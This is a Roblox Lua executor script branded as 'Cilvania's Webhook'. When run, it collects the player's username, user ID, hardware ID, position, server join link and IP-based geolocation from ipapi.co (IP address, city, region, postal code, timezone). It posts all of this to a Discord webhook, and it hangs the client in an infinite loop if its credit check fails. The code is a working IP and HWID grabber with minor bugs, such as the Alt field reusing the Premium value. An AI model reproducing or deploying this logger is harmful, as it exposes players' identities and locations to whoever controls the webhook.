
local CheckCredits = "dsc.gg/cilberionscripts"

if CheckCredits == getgenv().MadeByCilvania then
    -- Get the current time and date
    local OSTime = os.time()
    local Time = os.date('!*t', OSTime)

    -- Get the local player and check for Premium membership and alt account
    local LocalPlayer = game:GetService('Players').LocalPlayer

    -- Variables
    local Premium = false
    local Alt = false
    local Request = http_request or request or (syn and syn.request)
    local HttpService = game:GetService("HttpService")
    local Hwid = game:GetService("RbxAnalyticsService"):GetClientId();

    -- Premium Membership Check
    if LocalPlayer.MembershipType == Enum.MembershipType.Premium then
        Premium = true
    elseif LocalPlayer.MembershipType == Enum.MembershipType.None then
        Premium = false
    end

    -- If not premium then check if ALT
    if Premium == false then 
        if LocalPlayer.AccountAge <= 70 then 
            Alt = true
        end
    end

    -- Current Position
    local Position = LocalPlayer.Character.HumanoidRootPart.Position

    -- Get information about the game
    local Market = game:GetService("MarketplaceService")
    local GameInfo = Market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)

    -- Creation Date
    local CreationDate = HttpService:JSONDecode(Request({
        Url = "https://users.roblox.com/v1/users/".. LocalPlayer.UserId
    }).Body)

    -- Friend Count
    local FriendCount = HttpService:JSONDecode(Request({
        Url = "https://friends.roblox.com/v1/users/".. LocalPlayer.UserId .."/friends/count"
    }).Body)

    -- Normal Long Format
    local Embed = {
        title = "> ".. LocalPlayer.DisplayName .." | Cilvania's Webhook â„¢",
        color = getgenv().Settings.EmbedColor,
        thumbnail = { url = avatarIconUrl },
        fields = {
            { name = "Name", value = "```Name: " .. LocalPlayer.Name .."```", inline = true },
            { name = "Display Name", value = "```DP Name: " .. LocalPlayer.Name .."```", inline = true },
            { name = "User ID", value = "```ID: " .. LocalPlayer.UserId .."```", inline = true },
            { name = "Membership Info", value = "```Premium: " .. tostring(Premium) .."```", inline = true },
            { name = "Account Age", value = "```Age: " .. LocalPlayer.accountAge .. " days```", inline = true },
            { name = "Alt Account", value = "```Alt: " .. tostring(Premium) .."```", inline = true },
            { name = "Executor", value = "```Executor: " .. identifyexecutor() .."```", inline = true },
            { name = "Creation Date", value = "```Date: ".. CreationDate.created .. "```", inline = true },
            { name = "Friends Count", value = "```Friends Count: ".. FriendCount.count .. "```", inline = true },
            { name = "Hwid", value = "```Hwid: ".. Hwid .. "```", inline = false },
            { name = "Game Version", value = "```Game Version: " .. game.PlaceVersion .."```", inline = true },
            { name = "Server", value = "```JobId: " .. game.JobId .."```", inline = false },
            { name = "Position", value = "```Position: " .. tostring(Position) .."```", inline = false },
            { name = "Execution Time", value = "```Executed at: " .. os.date('%Y-%m-%d %H:%M:%S') .."```", inline = false },
            { name = "Roblox Profile", value = "[" .. LocalPlayer.DisplayName .. "](https://www.roblox.com/users/" .. LocalPlayer.UserId .. ")", inline = false },
            { name = "Game Link", value = "[" .. GameInfo.Name .. "](https://roblox.com/games/" .. game.PlaceId .. ")", inline = false },
            { name = "Join Game", value = "```roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. "```", inline = false },
        },
        footer = { text = "ðŸ””ãƒ»Executed by " .. LocalPlayer.Name .. " on " .. GameInfo.Name},
        timestamp = os.date('!%Y-%m-%dT%H:%M:%SZ')
    }

    -- Short format
    if getgenv().Settings.Formats.ShortFormat then
        Embed = {
            title = "> ".. LocalPlayer.DisplayName .." | Cilvania's Webhook â„¢ | Short Format",
            color = getgenv().Settings.EmbedColor,
            thumbnail = { url = avatarIconUrl },
            fields = {
                { name = "Name", value = "```Name: " .. LocalPlayer.Name .."```", inline = true },
                { name = "Display Name", value = "```DP Name: " .. LocalPlayer.Name .."```", inline = true },
                { name = "User ID", value = "```ID: " .. LocalPlayer.UserId .."```", inline = true },
                { name = "Hwid", value = "```Hwid: ".. Hwid .. "```", inline = false },
                { name = "Roblox Profile", value = "[" .. LocalPlayer.DisplayName .. "](https://www.roblox.com/users/" .. LocalPlayer.UserId .. ")", inline = false },
                { name = "Game Link", value = "[" .. GameInfo.Name .. "](https://roblox.com/games/" .. game.PlaceId .. ")", inline = false },
                { name = "Join Game", value = "```roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. "```", inline = false },
            },
            footer = { text = "ðŸ””ãƒ»Executed by " .. LocalPlayer.Name .. " on " .. GameInfo.Name},
            timestamp = os.date('!%Y-%m-%dT%H:%M:%SZ')
        }
    end

    -- Get information about the user's IP address
    local IPv4 = game:HttpGet("https://ipapi.co/ip")
    local Network = game:HttpGet("https://ipapi.co/network")
    local City = game:HttpGet("https://ipapi.co/city")
    local Region = game:HttpGet('https://ipapi.co/region')
    local Postal = game:HttpGet('https://ipapi.co/postal')
    local Timezone = game:HttpGet('https://ipapi.co/timezone')
    
    local Currency = game:HttpGet('https://ipapi.co/currency')
    local CurrencyName = game:HttpGet('https://ipapi.co/currency_name')
    
    local Country = game:HttpGet('https://ipapi.co/country')
    local CountryName = game:HttpGet('https://ipapi.co/country_name')
    
    local CountryPopulation = game:HttpGet('https://ipapi.co/country_population')

    -- IP Format
    local IPEmbed
    if getgenv().Settings.Formats.IpFormat then
        IPEmbed = {
            title = "> ".. LocalPlayer.DisplayName .." | Cilvania's Webhook â„¢ | IP Format",
            color = getgenv().Settings.EmbedColor, -- Use the same color
            thumbnail = { url = avatarIconUrl },
            fields = {
                { name = "IP Address", value = "```IP: " .. IPv4 .. "```", inline = true },
                { name = "Network", value = "```Network: " .. Network .. "```", inline = true },
                { name = "City", value = "```City: " .. City .. "```", inline = true }, 
                { name = "Region", value = "```Region: " .. Region .. "```", inline = true },
                { name = "Postal Code", value = "```Postal Code: " .. Postal .. "```", inline = true },
                { name = "Timezone", value = "```Timezone: " .. Timezone .. "```", inline = true },
                { name = "Country", value = "```Country: " .. Country .. " | " .. CountryName.. "```", inline = false },
                { name = "Currency", value = "```Currency: " .. Currency .. " | " .. CurrencyName .. "```", inline = false },
                { name = "Country Population", value = "```Population: " .. CountryPopulation .. "```", inline = false },
            },
            footer = { text = "ðŸ””ãƒ»Executed by " .. LocalPlayer.Name .. " on " .. GameInfo.Name},
            timestamp = os.date('!%Y-%m-%dT%H:%M:%SZ')
        }
    end

    -- Send the main "Embed" and the "IP Embed" to the Discord webhook if IPEmbed is defined
    if IPEmbed then
        (Request) {
            Url = getgenv().Settings.DiscordWebhook,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json',
            },
            Body = game:GetService('HttpService'):JSONEncode({
                content = Content,
                embeds = { Embed, IPEmbed } -- Include both Embeds
            }),
        }
    else
        -- Send only the main "Embed" if IPEmbed is not defined
        (Request) {
            Url = getgenv().Settings.DiscordWebhook,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json',
            },
            Body = game:GetService('HttpService'):JSONEncode({
                content = Content,
                embeds = { Embed }
            }),
        }
    end
else
    while true do
    end
end
